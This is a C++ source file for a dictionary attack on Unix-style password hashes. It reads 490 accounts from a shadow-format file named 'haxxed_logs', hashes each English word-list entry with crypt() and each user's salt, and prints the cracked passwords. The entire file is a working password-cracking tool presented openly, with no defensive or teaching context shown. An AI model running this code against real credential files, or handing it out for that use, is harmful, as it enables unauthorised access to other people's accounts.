#include <iostream>
#include <fstream>
#include <string>
#include <unistd.h>

using namespace std;

void dictionary()
{
	string users[490];
	string salts[490];
	string passwords[490];
	string rest_infos[490];
	string hash;

	string word;
	string encrypted_hash;
	string encrypted_password;

	ifstream shadow_file("haxxed_logs",ios::in);
	
	if(shadow_file.is_open())
	{	
		for(int i=0;i<490;i++)				//reading each account from file...
		{
			getline(shadow_file, users[i], ':');	//get username...
			getline(shadow_file, hash, ':');		//get hash (salt+password)...
			getline(shadow_file, rest_infos[i]);	//get additional info...

			salts[i]=hash.substr(0,12);				//split salt and password		
			passwords[i]=hash.substr(12,26);
		}
		
		cout<<"*******************************"<<endl;
		cout<<"Dictionary Attack Initiated..."<<endl;
		cout<<"*******************************"<<endl;
		
		for(int i=0;i<490;i++)					//for each user...
		{
			cout<<"Scanning for "<<users[i]<<"..."<<endl;

			ifstream dictionary("words.english", ios::in);

			while(!dictionary.eof())				//scan the dictionary...
			{
				dictionary>>word;				
					
				encrypted_hash=crypt(word.c_str(),salts[i].c_str());	//encrypt every word from dictionary with the user's salt...
				encrypted_password=encrypted_hash.substr(12,26);
 	
				if(encrypted_password==passwords[i])					//compare it to the hashed password
				{
					cout<<"\t"<<users[i]<<"'s password is: "<<word<<endl;
					break;
				}				
			}
				
			dictionary.close();
		}
			
		shadow_file.close();
		
		cout<<"*******************************"<<endl;

	}
	else
	{
		cout<<"Error opening account's database"<<endl;
	}

}
